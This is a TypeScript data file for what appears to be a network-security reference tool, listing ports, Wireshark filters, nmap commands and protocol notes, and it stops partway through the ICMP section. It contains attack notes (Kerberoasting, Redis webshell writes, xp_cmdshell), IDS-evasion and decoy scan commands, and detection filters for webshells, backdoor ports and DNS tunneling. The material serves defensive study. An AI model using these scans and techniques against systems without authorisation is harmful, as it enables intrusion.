// ─── Common Ports ────────────────────────────────────────────────────────────

export interface PortEntry {
  port: number
  proto: 'TCP' | 'UDP' | 'TCP/UDP'
  service: string
  description: string
  category: string
  notable?: string
}

export const ports: PortEntry[] = [
  // Remote access
  { port: 22,    proto: 'TCP',     service: 'SSH',          description: 'Secure Shell — encrypted remote access, SFTP, tunneling', category: 'Remote Access', notable: 'Default port — change in hardened configs. Brute-force magnet.' },
  { port: 23,    proto: 'TCP',     service: 'Telnet',       description: 'Unencrypted remote terminal', category: 'Remote Access', notable: 'Cleartext credentials. Never use. Presence = legacy or misconfigured system.' },
  { port: 3389,  proto: 'TCP',     service: 'RDP',          description: 'Remote Desktop Protocol — Windows remote desktop', category: 'Remote Access', notable: 'High-value lateral movement target. BlueKeep (CVE-2019-0708). NLA bypass attacks.' },
  { port: 5985,  proto: 'TCP',     service: 'WinRM HTTP',   description: 'Windows Remote Management (HTTP)', category: 'Remote Access', notable: 'PowerShell remoting. Evil-WinRM for lateral movement. Often overlooked in firewall rules.' },
  { port: 5986,  proto: 'TCP',     service: 'WinRM HTTPS',  description: 'Windows Remote Management (HTTPS)', category: 'Remote Access' },
  { port: 5900,  proto: 'TCP',     service: 'VNC',          description: 'Virtual Network Computing — remote desktop', category: 'Remote Access', notable: 'Often weak/no authentication on IoT and legacy systems. Shodan-exposed frequently.' },
  // Web
  { port: 80,    proto: 'TCP',     service: 'HTTP',         description: 'Hypertext Transfer Protocol — unencrypted web', category: 'Web', notable: 'Cleartext. Modern sites redirect to 443. Intercept with Burp/mitmproxy.' },
  { port: 443,   proto: 'TCP',     service: 'HTTPS',        description: 'HTTP over TLS — encrypted web', category: 'Web' },
  { port: 8080,  proto: 'TCP',     service: 'HTTP-alt',     description: 'Alternative HTTP — dev servers, proxies, Tomcat', category: 'Web', notable: 'Commonly unauthenticated admin interfaces. Tomcat manager default.' },
  { port: 8443,  proto: 'TCP',     service: 'HTTPS-alt',    description: 'Alternative HTTPS — dev/admin panels', category: 'Web' },
  { port: 8888,  proto: 'TCP',     service: 'HTTP-alt',     description: 'Jupyter notebooks, various dev servers', category: 'Web', notable: 'Jupyter often runs without auth on default config.' },
  { port: 3000,  proto: 'TCP',     service: 'HTTP-dev',     description: 'Node.js/React dev servers, Grafana', category: 'Web' },
  // Email
  { port: 25,    proto: 'TCP',     service: 'SMTP',         description: 'Simple Mail Transfer Protocol — MTA to MTA relay', category: 'Email', notable: 'Open relay = spam source. Should only accept from authorized MTAs.' },
  { port: 587,   proto: 'TCP',     service: 'SMTP-sub',     description: 'SMTP Submission — client to MTA (STARTTLS)', category: 'Email' },
  { port: 465,   proto: 'TCP',     service: 'SMTPS',        description: 'SMTP over SSL (deprecated but still used)', category: 'Email' },
  { port: 110,   proto: 'TCP',     service: 'POP3',         description: 'Post Office Protocol v3 — email retrieval (cleartext)', category: 'Email', notable: 'Cleartext credentials. Use POP3S (995) instead.' },
  { port: 995,   proto: 'TCP',     service: 'POP3S',        description: 'POP3 over SSL', category: 'Email' },
  { port: 143,   proto: 'TCP',     service: 'IMAP',         description: 'Internet Message Access Protocol — email (cleartext)', category: 'Email', notable: 'Cleartext. Use IMAPS (993).' },
  { port: 993,   proto: 'TCP',     service: 'IMAPS',        description: 'IMAP over SSL', category: 'Email' },
  // File transfer
  { port: 21,    proto: 'TCP',     service: 'FTP',          description: 'File Transfer Protocol control channel — cleartext', category: 'File Transfer', notable: 'Cleartext credentials and data. Anonymous FTP common on old systems. Use SFTP/FTPS.' },
  { port: 20,    proto: 'TCP',     service: 'FTP-data',     description: 'FTP active mode data channel', category: 'File Transfer' },
  { port: 990,   proto: 'TCP',     service: 'FTPS',         description: 'FTP over SSL (implicit)', category: 'File Transfer' },
  { port: 69,    proto: 'UDP',     service: 'TFTP',         description: 'Trivial FTP — no auth, used for PXE boot, network device config', category: 'File Transfer', notable: 'No authentication. Used by network devices for config/firmware. Often forgotten.' },
  { port: 445,   proto: 'TCP',     service: 'SMB',          description: 'Server Message Block — Windows file sharing, AD', category: 'File Transfer', notable: 'EternalBlue/WannaCry (CVE-2017-0144). Relay attacks (NTLM). Block at perimeter always.' },
  { port: 139,   proto: 'TCP',     service: 'NetBIOS-SSN',  description: 'NetBIOS Session — legacy SMB over NetBIOS', category: 'File Transfer' },
  { port: 2049,  proto: 'TCP/UDP', service: 'NFS',          description: 'Network File System', category: 'File Transfer', notable: 'Often misconfigured with world-readable exports. Check /etc/exports.' },
  // Directory / Auth
  { port: 389,   proto: 'TCP/UDP', service: 'LDAP',         description: 'Lightweight Directory Access Protocol — cleartext', category: 'Directory/Auth', notable: 'Cleartext. LDAP null bind often allowed. Enumerate AD with ldapsearch.' },
  { port: 636,   proto: 'TCP',     service: 'LDAPS',        description: 'LDAP over SSL', category: 'Directory/Auth' },
  { port: 3268,  proto: 'TCP',     service: 'GC LDAP',      description: 'Active Directory Global Catalog', category: 'Directory/Auth' },
  { port: 88,    proto: 'TCP/UDP', service: 'Kerberos',     description: 'Kerberos authentication — Active Directory', category: 'Directory/Auth', notable: 'Kerberoasting: request TGS for SPNs → crack offline. AS-REP roasting targets no-preauth accounts.' },
  { port: 464,   proto: 'TCP/UDP', service: 'Kerberos PW',  description: 'Kerberos password change', category: 'Directory/Auth' },
  // DNS
  { port: 53,    proto: 'TCP/UDP', service: 'DNS',          description: 'Domain Name System — UDP for queries, TCP for zone transfers and large responses', category: 'DNS', notable: 'DNS tunneling C2 (iodine, dnscat2). Zone transfer (AXFR) exposes all records. DNS exfil via subdomains.' },
  // Network services
  { port: 67,    proto: 'UDP',     service: 'DHCP-server',  description: 'DHCP server — assigns IP addresses', category: 'Network Services', notable: 'Rogue DHCP server can redirect traffic. DHCP starvation attack.' },
  { port: 68,    proto: 'UDP',     service: 'DHCP-client',  description: 'DHCP client', category: 'Network Services' },
  { port: 123,   proto: 'UDP',     service: 'NTP',          description: 'Network Time Protocol', category: 'Network Services', notable: 'NTP amplification DDoS. Monlist command exposes client list.' },
  { port: 161,   proto: 'UDP',     service: 'SNMP',         description: 'Simple Network Management Protocol — monitoring', category: 'Network Services', notable: 'Community string "public" default. v1/v2c cleartext. SNMP walk reveals full device config.' },
  { port: 162,   proto: 'UDP',     service: 'SNMP-trap',    description: 'SNMP trap receiver', category: 'Network Services' },
  { port: 514,   proto: 'UDP',     service: 'Syslog',       description: 'System log forwarding — cleartext', category: 'Network Services', notable: 'Cleartext UDP. Log injection possible. TCP syslog (514/TCP) more reliable.' },
  // Databases
  { port: 1433,  proto: 'TCP',     service: 'MSSQL',        description: 'Microsoft SQL Server', category: 'Database', notable: 'xp_cmdshell for RCE if sysadmin. SA account brute-force common.' },
  { port: 1434,  proto: 'UDP',     service: 'MSSQL-mon',    description: 'MSSQL Browser/Monitor', category: 'Database' },
  { port: 3306,  proto: 'TCP',     service: 'MySQL',        description: 'MySQL / MariaDB', category: 'Database', notable: 'Root with no password default on some installs. UDF injection for code execution.' },
  { port: 5432,  proto: 'TCP',     service: 'PostgreSQL',   description: 'PostgreSQL database', category: 'Database' },
  { port: 6379,  proto: 'TCP',     service: 'Redis',        description: 'Redis in-memory database', category: 'Database', notable: 'No auth by default. Write SSH keys, cron jobs, or webshells via Redis CONFIG SET.' },
  { port: 27017, proto: 'TCP',     service: 'MongoDB',      description: 'MongoDB database', category: 'Database', notable: 'No auth by default. Massive data breaches from exposed instances.' },
  { port: 9200,  proto: 'TCP',     service: 'Elasticsearch',description: 'Elasticsearch REST API', category: 'Database', notable: 'No auth by default. Read/write all data via HTTP.' },
  { port: 5601,  proto: 'TCP',     service: 'Kibana',       description: 'Elasticsearch Kibana UI', category: 'Database' },
  // VPN/Tunneling
  { port: 500,   proto: 'UDP',     service: 'IKE',          description: 'IPsec IKE — VPN key exchange', category: 'VPN/Tunnel' },
  { port: 4500,  proto: 'UDP',     service: 'IPsec NAT-T',  description: 'IPsec NAT traversal', category: 'VPN/Tunnel' },
  { port: 1194,  proto: 'TCP/UDP', service: 'OpenVPN',      description: 'OpenVPN', category: 'VPN/Tunnel' },
  { port: 51820, proto: 'UDP',     service: 'WireGuard',    description: 'WireGuard VPN', category: 'VPN/Tunnel' },
  { port: 1723,  proto: 'TCP',     service: 'PPTP',         description: 'Point-to-Point Tunneling Protocol — deprecated', category: 'VPN/Tunnel', notable: 'Cryptographically broken. Do not use.' },
  // Infrastructure
  { port: 179,   proto: 'TCP',     service: 'BGP',          description: 'Border Gateway Protocol — internet routing', category: 'Infrastructure' },
  { port: 520,   proto: 'UDP',     service: 'RIP',          description: 'Routing Information Protocol', category: 'Infrastructure' },
  { port: 2181,  proto: 'TCP',     service: 'ZooKeeper',    description: 'Apache ZooKeeper — distributed coordination', category: 'Infrastructure', notable: 'No auth by default. Access = read/write all ZK data including Kafka configs.' },
  { port: 9092,  proto: 'TCP',     service: 'Kafka',        description: 'Apache Kafka message broker', category: 'Infrastructure' },
  { port: 2375,  proto: 'TCP',     service: 'Docker',       description: 'Docker daemon API (unencrypted)', category: 'Infrastructure', notable: 'Exposed Docker socket = root on host. Trivial container escape → host access.' },
  { port: 2376,  proto: 'TCP',     service: 'Docker TLS',   description: 'Docker daemon API (TLS)', category: 'Infrastructure' },
  { port: 6443,  proto: 'TCP',     service: 'K8s API',      description: 'Kubernetes API server', category: 'Infrastructure', notable: 'Unauthenticated access = cluster takeover. Often exposed in cloud misconfigs.' },
  { port: 10250, proto: 'TCP',     service: 'Kubelet',      description: 'Kubernetes Kubelet API', category: 'Infrastructure', notable: 'Unauthenticated kubelet allows exec into any pod on the node.' },
  // Misc
  { port: 111,   proto: 'TCP/UDP', service: 'RPCbind',      description: 'RPC portmapper', category: 'Misc', notable: 'Enumerate NFS/NIS services. Often a pivot point for NFS exploitation.' },
  { port: 135,   proto: 'TCP',     service: 'MS-RPC',       description: 'Microsoft RPC endpoint mapper', category: 'Misc', notable: 'WMI, DCOM, PsExec all use this. Required for many Windows remote operations.' },
  { port: 137,   proto: 'UDP',     service: 'NetBIOS-NS',   description: 'NetBIOS name service', category: 'Misc', notable: 'NBNS poisoning with Responder. Should not be exposed outside LAN.' },
  { port: 138,   proto: 'UDP',     service: 'NetBIOS-DGM',  description: 'NetBIOS datagram service', category: 'Misc' },
  { port: 623,   proto: 'UDP',     service: 'IPMI',         description: 'Intelligent Platform Management Interface', category: 'Misc', notable: 'IPMI 2.0 RAKP auth flaw allows offline hash crack. Cipher 0 bypass. High-value target.' },
]

// ─── Wireshark Display Filters ───────────────────────────────────────────────

export interface WiresharkFilter {
  category: string
  filter: string
  description: string
  notes?: string
}

export const wiresharkFilters: WiresharkFilter[] = [
  // IP / Host
  { category: 'IP / Host', filter: 'ip.addr == 192.168.1.100', description: 'All traffic to or from IP' },
  { category: 'IP / Host', filter: 'ip.src == 192.168.1.100', description: 'Traffic FROM IP' },
  { category: 'IP / Host', filter: 'ip.dst == 192.168.1.100', description: 'Traffic TO IP' },
  { category: 'IP / Host', filter: 'ip.addr == 192.168.1.0/24', description: 'All traffic to/from subnet' },
  { category: 'IP / Host', filter: '!(ip.addr == 192.168.1.100)', description: 'Exclude specific IP' },
  { category: 'IP / Host', filter: 'ip.src == 10.0.0.0/8 && ip.dst == 10.0.0.0/8', description: 'Internal-to-internal traffic only' },
  { category: 'IP / Host', filter: '!(ip.src == 10.0.0.0/8 || ip.src == 172.16.0.0/12 || ip.src == 192.168.0.0/16)', description: 'External (non-RFC1918) source traffic' },
  // Ports / Protocol
  { category: 'Ports / Protocol', filter: 'tcp.port == 443', description: 'Any traffic on TCP 443 (src or dst)' },
  { category: 'Ports / Protocol', filter: 'tcp.dstport == 80 || tcp.dstport == 443', description: 'Outbound web traffic' },
  { category: 'Ports / Protocol', filter: 'udp.port == 53', description: 'DNS traffic (UDP)' },
  { category: 'Ports / Protocol', filter: 'tcp.port == 22 || tcp.port == 23 || tcp.port == 3389', description: 'Remote access protocols' },
  { category: 'Ports / Protocol', filter: 'not tcp.port == 80 and not tcp.port == 443 and not udp.port == 53', description: 'Non-standard web/DNS — good for spotting tunneling' },
  // TCP analysis
  { category: 'TCP', filter: 'tcp.flags.syn == 1 && tcp.flags.ack == 0', description: 'SYN packets only — port scans, new connections' },
  { category: 'TCP', filter: 'tcp.flags.reset == 1', description: 'TCP RST packets — rejected connections, crashes' },
  { category: 'TCP', filter: 'tcp.flags.fin == 1', description: 'TCP FIN — connection teardown' },
  { category: 'TCP', filter: 'tcp.analysis.retransmission', description: 'Retransmissions — network quality issues or packet loss' },
  { category: 'TCP', filter: 'tcp.analysis.zero_window', description: 'Zero window — receiver buffer full, flow control' },
  { category: 'TCP', filter: 'tcp.analysis.duplicate_ack', description: 'Duplicate ACKs — precursor to retransmission' },
  { category: 'TCP', filter: 'tcp.analysis.flags', description: 'Any TCP expert info flags (errors, warnings)' },
  { category: 'TCP', filter: 'tcp.stream eq 5', description: 'Follow specific TCP stream by stream index' },
  // HTTP
  { category: 'HTTP', filter: 'http', description: 'All HTTP traffic' },
  { category: 'HTTP', filter: 'http.request', description: 'HTTP requests only' },
  { category: 'HTTP', filter: 'http.response', description: 'HTTP responses only' },
  { category: 'HTTP', filter: 'http.request.method == "POST"', description: 'HTTP POST requests — form submissions, logins, uploads' },
  { category: 'HTTP', filter: 'http.response.code == 200', description: 'Successful HTTP responses' },
  { category: 'HTTP', filter: 'http.response.code >= 400', description: 'HTTP errors (4xx client, 5xx server)' },
  { category: 'HTTP', filter: 'http.host contains "evil"', description: 'HTTP host header contains string' },
  { category: 'HTTP', filter: 'http.request.uri contains "passwd" || http.request.uri contains "etc"', description: 'LFI/path traversal attempts' },
  { category: 'HTTP', filter: 'http.user_agent contains "sqlmap"', description: 'Tool-specific user agents' },
  // DNS
  { category: 'DNS', filter: 'dns', description: 'All DNS traffic' },
  { category: 'DNS', filter: 'dns.qry.name contains "evil.com"', description: 'DNS queries for specific domain' },
  { category: 'DNS', filter: 'dns.flags.rcode != 0', description: 'DNS errors (NXDOMAIN, REFUSED, etc.)' },
  { category: 'DNS', filter: 'dns.count.answers == 0 && dns.flags.response == 1', description: 'DNS responses with no answers (NXDOMAIN)' },
  { category: 'DNS', filter: 'dns.qry.type == 255', description: 'DNS ANY queries — often used in amplification attacks' },
  { category: 'DNS', filter: 'dns.qry.name matches "^[a-z0-9]{20,}\\."', description: 'Long random subdomains — DGA or DNS tunneling indicator' },
  { category: 'DNS', filter: 'dns && frame.len > 512', description: 'Unusually large DNS packets — potential tunneling' },
  // TLS / SSL
  { category: 'TLS', filter: 'tls', description: 'All TLS traffic' },
  { category: 'TLS', filter: 'tls.handshake.type == 1', description: 'TLS ClientHello — new connections' },
  { category: 'TLS', filter: 'tls.handshake.type == 2', description: 'TLS ServerHello' },
  { category: 'TLS', filter: 'tls.alert_message', description: 'TLS alerts — handshake failures, cert errors' },
  { category: 'TLS', filter: 'ssl.record.version == 0x0301', description: 'TLS 1.0 (deprecated/insecure)' },
  { category: 'TLS', filter: 'ssl.record.version == 0x0302', description: 'TLS 1.1 (deprecated/insecure)' },
  { category: 'TLS', filter: 'tls.handshake.extensions_server_name contains "target.com"', description: 'TLS SNI — see which domain client is connecting to without decryption' },
  // ICMP
  { category: 'ICMP', filter: 'icmp', description: 'All ICMP traffic' },
  { category: 'ICMP', filter: 'icmp.type == 8', description: 'ICMP echo request (ping)' },
  { category: 'ICMP', filter: 'icmp.type == 0', description: 'ICMP echo reply (ping response)' },
  { category: 'ICMP', filter: 'icmp.type == 3', description: 'ICMP destination unreachable' },
  { category: 'ICMP', filter: 'icmp && frame.len > 100', description: 'Large ICMP packets — potential ICMP tunneling (iodine)' },
  { category: 'ICMP', filter: 'icmp && ip.src == 192.168.1.100 && frame.len > 1000', description: 'Large ICMP from specific host — covert channel indicator' },
  // ARP
  { category: 'ARP', filter: 'arp', description: 'All ARP traffic' },
  { category: 'ARP', filter: 'arp.opcode == 1', description: 'ARP requests' },
  { category: 'ARP', filter: 'arp.opcode == 2', description: 'ARP replies' },
  { category: 'ARP', filter: 'arp.duplicate-address-detected', description: 'Duplicate IP detected — ARP poisoning indicator' },
  // Credentials / Sensitive
  { category: 'Credentials', filter: 'ftp.request.command == "PASS"', description: 'FTP passwords in cleartext' },
  { category: 'Credentials', filter: 'http.authbasic', description: 'HTTP Basic Auth credentials' },
  { category: 'Credentials', filter: 'ldap.bindRequest', description: 'LDAP bind requests — may contain credentials' },
  { category: 'Credentials', filter: 'telnet', description: 'All Telnet — cleartext session' },
  { category: 'Credentials', filter: 'smtp.req.command == "AUTH"', description: 'SMTP authentication attempts' },
  // Malware / C2 indicators
  { category: 'Threat Hunting', filter: 'tcp.dstport == 4444 || tcp.dstport == 1337 || tcp.dstport == 31337', description: 'Common Metasploit/backdoor ports' },
  { category: 'Threat Hunting', filter: 'http.request.uri contains ".php?cmd=" || http.request.uri contains "eval("', description: 'Webshell command execution patterns' },
  { category: 'Threat Hunting', filter: 'ip.dst == 8.8.8.8 && !udp.port == 53', description: 'Non-DNS traffic to Google DNS — potential tunneling' },
  { category: 'Threat Hunting', filter: 'frame.time_delta > 30 && tcp.len > 0', description: 'Beaconing pattern — periodic data transfer with long pauses' },
  { category: 'Threat Hunting', filter: '(tcp.flags.syn == 1 && tcp.flags.ack == 0) && ip.src == 192.168.1.100', description: 'Port scan from internal host' },
  { category: 'Threat Hunting', filter: 'dns.qry.name matches "^[0-9a-f]{32}\\." || dns.qry.name matches "^[0-9a-f]{16}\\."', description: 'Hex-encoded subdomains — DNS tunneling or DGA' },
]

// ─── Nmap Reference ──────────────────────────────────────────────────────────

export interface NmapCommand {
  category: string
  cmd: string
  description: string
  notes?: string
}

export const nmapCommands: NmapCommand[] = [
  // Host discovery
  { category: 'Host Discovery', cmd: 'nmap -sn 192.168.1.0/24', description: 'Ping sweep — discover live hosts without port scanning', notes: 'Uses ICMP, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp. Fast subnet discovery.' },
  { category: 'Host Discovery', cmd: 'nmap -sn -PS22,80,443 192.168.1.0/24', description: 'TCP SYN ping on specific ports — bypass ICMP-blocking firewalls' },
  { category: 'Host Discovery', cmd: 'nmap -sn -PA80,443 192.168.1.0/24', description: 'TCP ACK ping — often passes stateless firewalls' },
  { category: 'Host Discovery', cmd: 'nmap -sn --send-ip 192.168.1.0/24', description: 'ARP ping on local network (layer 2) — most reliable on LAN' },
  { category: 'Host Discovery', cmd: 'nmap -Pn 192.168.1.100', description: 'Skip host discovery — treat host as up regardless (useful when ICMP blocked)' },
  // Port scanning
  { category: 'Port Scanning', cmd: 'nmap -sS 192.168.1.100', description: 'SYN scan (stealth) — doesn\'t complete TCP handshake. Requires root.', notes: 'Default scan type when run as root. Faster and less likely to fill connection logs.' },
  { category: 'Port Scanning', cmd: 'nmap -sT 192.168.1.100', description: 'TCP connect scan — completes full handshake. Works without root.' },
  { category: 'Port Scanning', cmd: 'nmap -sU 192.168.1.100', description: 'UDP scan — slow but finds DNS, SNMP, DHCP, NTP services', notes: 'Very slow. Combine with -F for top ports only: nmap -sU -F target' },
  { category: 'Port Scanning', cmd: 'nmap -p 1-65535 192.168.1.100', description: 'Full port scan — all 65535 ports' },
  { category: 'Port Scanning', cmd: 'nmap -p 22,80,443,445,3389 192.168.1.100', description: 'Specific port list' },
  { category: 'Port Scanning', cmd: 'nmap -F 192.168.1.100', description: 'Fast scan — top 100 most common ports' },
  { category: 'Port Scanning', cmd: 'nmap --top-ports 1000 192.168.1.100', description: 'Top N most common ports' },
  // Service / Version
  { category: 'Service Detection', cmd: 'nmap -sV 192.168.1.100', description: 'Service version detection — identify software and version on open ports' },
  { category: 'Service Detection', cmd: 'nmap -sV --version-intensity 9 192.168.1.100', description: 'Aggressive version detection — more probes, slower, more accurate' },
  { category: 'Service Detection', cmd: 'nmap -O 192.168.1.100', description: 'OS detection — fingerprint operating system (requires root)' },
  { category: 'Service Detection', cmd: 'nmap -A 192.168.1.100', description: 'Aggressive: OS detection + version + scripts + traceroute', notes: 'Noisy. Use for detailed single-host enumeration, not wide network sweeps.' },
  // Scripts (NSE)
  { category: 'NSE Scripts', cmd: 'nmap -sC 192.168.1.100', description: 'Default NSE scripts — safe, informational' },
  { category: 'NSE Scripts', cmd: 'nmap --script=banner 192.168.1.100', description: 'Grab service banners' },
  { category: 'NSE Scripts', cmd: 'nmap --script=http-title -p 80,443,8080,8443 192.168.1.0/24', description: 'Get HTTP page titles across subnet' },
  { category: 'NSE Scripts', cmd: 'nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.0/24', description: 'Check for EternalBlue/MS17-010 (WannaCry)' },
  { category: 'NSE Scripts', cmd: 'nmap --script=smb-security-mode -p 445 192.168.1.0/24', description: 'SMB security settings — signing, auth level' },
  { category: 'NSE Scripts', cmd: 'nmap --script=dns-zone-transfer -p 53 ns1.target.com', description: 'Attempt DNS zone transfer (AXFR)' },
  { category: 'NSE Scripts', cmd: 'nmap --script=ssl-cert,ssl-enum-ciphers -p 443 192.168.1.100', description: 'TLS certificate info and cipher suite enumeration' },
  { category: 'NSE Scripts', cmd: 'nmap --script=ftp-anon -p 21 192.168.1.0/24', description: 'Check for anonymous FTP login' },
  { category: 'NSE Scripts', cmd: 'nmap --script=snmp-info -sU -p 161 192.168.1.0/24', description: 'SNMP information gathering' },
  { category: 'NSE Scripts', cmd: 'nmap --script=ldap-rootdse -p 389 192.168.1.0/24', description: 'LDAP root DSE — AD domain info without auth' },
  { category: 'NSE Scripts', cmd: 'nmap --script=vuln 192.168.1.100', description: 'Run all vulnerability scripts (noisy, may crash services)' },
  // Timing / Evasion
  { category: 'Timing / Evasion', cmd: 'nmap -T0 192.168.1.100', description: 'Paranoid timing — very slow, IDS evasion' },
  { category: 'Timing / Evasion', cmd: 'nmap -T1 192.168.1.100', description: 'Sneaky timing — slow, reduces IDS detection' },
  { category: 'Timing / Evasion', cmd: 'nmap -T3 192.168.1.100', description: 'Normal timing (default)' },
  { category: 'Timing / Evasion', cmd: 'nmap -T4 192.168.1.100', description: 'Aggressive timing — faster, assumes reliable network' },
  { category: 'Timing / Evasion', cmd: 'nmap -T5 192.168.1.100', description: 'Insane timing — fastest, may miss ports on slow networks' },
  { category: 'Timing / Evasion', cmd: 'nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.100', description: 'Decoy scan — mix real scan with fake sources', notes: 'ME = insert your real IP among decoys. Decoys must be up or target may be unreachable.' },
  { category: 'Timing / Evasion', cmd: 'nmap -f 192.168.1.100', description: 'Fragment packets — may evade older packet filters' },
  { category: 'Timing / Evasion', cmd: 'nmap --source-port 53 192.168.1.100', description: 'Spoof source port — some firewalls allow DNS source port through' },
  // Output
  { category: 'Output', cmd: 'nmap -oN scan.txt 192.168.1.0/24', description: 'Normal text output to file' },
  { category: 'Output', cmd: 'nmap -oX scan.xml 192.168.1.0/24', description: 'XML output — parseable by tools' },
  { category: 'Output', cmd: 'nmap -oG scan.gnmap 192.168.1.0/24', description: 'Grepable output — easy to parse with grep/awk' },
  { category: 'Output', cmd: 'nmap -oA scan 192.168.1.0/24', description: 'All formats simultaneously (normal, XML, grepable)' },
  { category: 'Output', cmd: 'nmap -v 192.168.1.100', description: 'Verbose — shows open ports as found, progress' },
  { category: 'Output', cmd: 'nmap -v --reason 192.168.1.100', description: 'Show reason for port state (SYN-ACK, RST, etc.)' },
  // Common combinations
  { category: 'Common Combos', cmd: 'nmap -sS -sV -sC -O -p- --open -oA full_scan 192.168.1.100', description: 'Full enumeration: all ports, versions, default scripts, OS detection' },
  { category: 'Common Combos', cmd: 'nmap -sS -T4 --top-ports 1000 -oA quick 192.168.1.0/24', description: 'Quick subnet sweep — top 1000 ports, fast timing' },
  { category: 'Common Combos', cmd: 'nmap -sU -sS -p U:53,111,137,161,T:21-23,25,53,80,139,443,445,3389 192.168.1.100', description: 'Common TCP+UDP services in one scan' },
  { category: 'Common Combos', cmd: 'nmap -sn 192.168.1.0/24 | grep "Nmap scan report" | awk \'{print $5}\' > live_hosts.txt', description: 'Extract live host IPs to file for follow-up scanning' },
]

// ─── Protocol Quick Reference ─────────────────────────────────────────────────

export interface ProtocolSection {
  protocol: string
  overview: string
  ports: string
  keyFacts: string[]
  packetStructure?: { field: string; size: string; description: string }[]
  securityNotes: string[]
  wiresharkTip: string
}

export const protocols: ProtocolSection[] = [
  {
    protocol: 'DNS',
    overview: 'Domain Name System — translates hostnames to IPs and back. UDP port 53 for queries (<512 bytes), TCP port 53 for zone transfers and large responses.',
    ports: 'UDP/TCP 53',
    keyFacts: [
      'Query types: A (IPv4), AAAA (IPv6), MX (mail), CNAME (alias), PTR (reverse), NS (nameserver), TXT (misc), SOA (zone authority), SRV (service), AXFR (zone transfer)',
      'Recursive vs iterative: client asks recursive resolver → resolver queries authoritative servers on client\'s behalf',
      'TTL: how long resolvers cache the answer (seconds). Low TTL = fast propagation, high TTL = less load',
      'DNSSEC: adds cryptographic signatures to records. Validates authenticity but not confidentiality',
      'DNS over HTTPS (DoH) / DNS over TLS (DoT): encrypts DNS queries. Bypasses local DNS monitoring',
      'Response codes: 0=NOERROR, 1=FORMERR, 2=SERVFAIL, 3=NXDOMAIN, 5=REFUSED',
      'Negative caching: NXDOMAIN responses also cached per TTL',
    ],
    securityNotes: [
      'DNS cache poisoning: attacker injects false records into resolver cache (Kaminsky attack)',
      'DNS amplification: small ANY query → large response, spoofed source = DDoS amplifier (factor 70x)',
      'DNS tunneling: encode data in subdomain labels (dnscat2, iodine). Bypasses HTTP/S firewalls',
      'AXFR zone transfer: reveals all DNS records if not restricted. Test: dig @nameserver AXFR domain.com',
      'Subdomain takeover: CNAME pointing to deprovisioned cloud resource → claim it',
      'DNS rebinding: attacker controls DNS TTL to rotate between external and internal IPs, bypassing SOP',
    ],
    wiresharkTip: 'dns — show all. dns.flags.rcode != 0 — show errors. dns.qry.name contains "target" — specific domain queries.',
  },
  {
    protocol: 'HTTP/HTTPS',
    overview: 'Hypertext Transfer Protocol — application layer protocol for web communication. HTTP is cleartext on port 80; HTTPS wraps HTTP in TLS on port 443.',
    ports: 'TCP 80 (HTTP), TCP 443 (HTTPS)',
    keyFacts: [
      'Methods: GET (retrieve), POST (submit data), PUT (replace), PATCH (partial update), DELETE (remove), HEAD (headers only), OPTIONS (capabilities), CONNECT (tunnel)',
      'Status codes: 1xx=informational, 2xx=success, 3xx=redirect, 4xx=client error, 5xx=server error',
      'Headers: Host, User-Agent, Authorization, Cookie, Content-Type, X-Forwarded-For, Referer, Accept',
      'HTTP/1.1: persistent connections (keep-alive). HTTP/2: multiplexing, header compression (HPACK), binary framing. HTTP/3: QUIC (UDP-based)',
      'Cookies: Set-Cookie (server→client), Cookie (client→server). Flags: Secure, HttpOnly, SameSite',
      'CORS: Cross-Origin Resource Sharing — browser enforces Access-Control-Allow-Origin header',
      'Content-Security-Policy: restricts sources of scripts, styles, images',
    ],
    securityNotes: [
      'HTTP Basic Auth: Base64-encoded credentials in Authorization header — trivially decoded. Not encryption.',
      'HTTP to HTTPS redirect: HSTS (Strict-Transport-Security) enforces HTTPS and prevents SSL stripping',
      'Clickjacking: X-Frame-Options or CSP frame-ancestors prevents page embedding in iframes',
      'Host header injection: manipulating Host header can affect password reset links, cache poisoning',
      'HTTP Request Smuggling: discrepancy between front-end and back-end servers in parsing Content-Length vs Transfer-Encoding',
      'HTTPS does not hide URL path — only the hostname is protected from network observers (via TLS SNI + certificate)',
    ],
    wiresharkTip: 'http — all HTTP. http.request.method == "POST" — form submissions. http.response.code >= 400 — errors. Statistics → HTTP → Requests for domain summary.',
  },
  {
    protocol: 'TLS/SSL',
    overview: 'Transport Layer Security — cryptographic protocol providing confidentiality, integrity, and authentication for TCP connections. SSL is deprecated; use TLS 1.2 or 1.3.',
    ports: 'Wraps any TCP port — most commonly 443',
    keyFacts: [
      'TLS 1.3 (RFC 8446): 1-RTT or 0-RTT handshake, removes RSA key exchange, forward secrecy mandatory, fewer cipher suites',
      'TLS 1.2: 2-RTT handshake, supports RSA and ECDHE key exchange, wider cipher suite support',
      'TLS 1.0/1.1: deprecated. TLS 1.0 allows BEAST attack (CBC). Both should be disabled.',
      'Handshake: ClientHello → ServerHello + Certificate → ClientKeyExchange → ChangeCipherSpec → Finished',
      'Certificate: X.509 format. Fields: Subject, Issuer, SAN (Subject Alternative Names), validity period, public key',
      'Certificate chain: leaf cert → intermediate CA(s) → root CA. Client validates chain to trusted root.',
      'SNI (Server Name Indication): TLS extension in ClientHello that reveals target hostname — visible without decryption',
      'OCSP stapling: server includes certificate revocation status in handshake',
      'Perfect Forward Secrecy (PFS): ephemeral keys (ECDHE/DHE) ensure past sessions not decryptable if long-term key compromised',
    ],
    securityNotes: [
      'BEAST: CBC mode IV predictability in TLS 1.0 (mitigated by client-side)',
      'POODLE: SSL 3.0 padding oracle — force downgrade to SSL 3.0 then exploit (SSLv3 must be disabled)',
      'HEARTBLEED (CVE-2014-0160): OpenSSL buffer over-read leaks up to 64KB of server memory per request',
      'DROWN: servers supporting SSLv2 can be used to decrypt TLS 1.2 sessions (cross-protocol attack)',
      'Certificate pinning: app hardcodes expected cert/public key fingerprint — prevents MitM with rogue certs',
      'SSL stripping (Moxie Marlinspike): MITM downgrades HTTPS to HTTP before client sees redirect (countered by HSTS)',
      'Weak cipher suites: RC4, 3DES, export-grade (FREAK, Logjam) must be disabled',
    ],
    wiresharkTip: 'tls.handshake.type == 1 — ClientHellos. tls.alert_message — failures. tls.handshake.extensions_server_name — see target hostname without decryption. Decrypt TLS with server private key or session key log (SSLKEYLOGFILE env var).',
  },
  {
    protocol: 'ICMP',
    overview: 'Internet Control Message Protocol — network layer error reporting and diagnostics. Carried directly in IP packets (protocol number 1).',
    ports: 'No ports — IP Protocol 1',
    keyFacts: [
      'Type 0: Echo Reply (ping response)',
